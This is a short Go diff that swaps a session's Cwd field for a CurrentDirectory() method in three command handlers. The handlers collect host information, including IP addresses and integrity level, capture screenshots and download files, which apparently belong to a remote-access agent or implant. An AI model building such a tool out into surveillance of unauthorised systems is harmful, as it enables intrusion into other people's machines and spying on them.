@@ -52,7 +52,7 @@ func cmdGetinfo(s *Session, _ []string) (int, string) {
 		"go_version":   runtime.Version(),
 		"architecture": runtime.GOARCH,
 		"cpu_count":    strconv.Itoa(runtime.NumCPU()),
-		"cwd":          s.Cwd,
+		"cwd":          s.CurrentDirectory(),
 		"exec_path":    safeExecutablePath(),
 		"ips":          strings.Join(ips, ", "),
 		"integrity":    detectIntegrity(),
@@ -66,7 +66,7 @@ func cmdGetinfo(s *Session, _ []string) (int, string) {
 }
 
 func cmdScreenshot(s *Session, _ []string) (int, string) {
-	filePath, err := captureScreenshotToTemp(s.Cwd)
+	filePath, err := captureScreenshotToTemp(s.CurrentDirectory())
 	if err != nil {
 		return 0, fmt.Sprintf("Screenshot failed: %v", err)
 	}
@@ -86,7 +86,7 @@ func cmdDownload(s *Session, args []string) (int, string) {
 	}
 
 	if !filepath.IsAbs(target) {
-		target = filepath.Join(s.Cwd, target)
+		target = filepath.Join(s.CurrentDirectory(), target)
 	}
 	target = filepath.Clean(target)
 
